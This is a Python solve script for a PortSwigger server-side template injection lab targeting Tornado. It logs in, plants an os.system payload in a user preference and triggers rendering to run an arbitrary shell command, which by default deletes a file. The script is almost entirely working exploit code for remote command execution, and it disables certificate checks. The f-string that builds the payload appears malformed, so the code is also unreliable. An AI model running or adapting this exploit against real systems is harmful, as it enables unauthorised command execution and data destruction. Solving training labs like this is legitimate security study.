#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Basic server-side template injection (code context) — Tornado.

Logs in, injects the RCE payload into the blog-post-author-display preference,
then fetches a blog post to trigger template rendering and execute the command.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def set_author_display(session: requests.Session, lab: str, payload: str) -> None:
    csrf = get_csrf(session, f"{lab}/my-account")
    r = session.post(
        f"{lab}/my-account/change-blog-post-author-display",
        data={"blog-post-author-display": payload, "csrf": csrf}
    )
    print(f"[*] Preference set — status {r.status_code}")


def trigger(session: requests.Session, lab: str) -> None:
    # Fetch the first blog post to trigger template rendering
    r = session.get(f"{lab}/")
    post_ids = re.findall(r'postId=(\d+)', r.text)
    if not post_ids:
        print("[-] No blog posts found — visit a post manually to trigger")
        return
    pid = post_ids[0]
    r2 = session.get(f"{lab}/post?postId={pid}")
    print(f"[*] Triggered render on post {pid} — status {r2.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 2 (Tornado code context)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument(
        "--cmd",
        default="rm /home/carlos/morale.txt",
        help="Command to execute"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    payload = f"}}{{% import os %}}}{{{{os.system('{args.cmd}')"
    print(f"[*] Setting author display payload: {payload}")
    set_author_display(s, lab, payload)

    print("[*] Triggering template render...")
    trigger(s, lab)
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
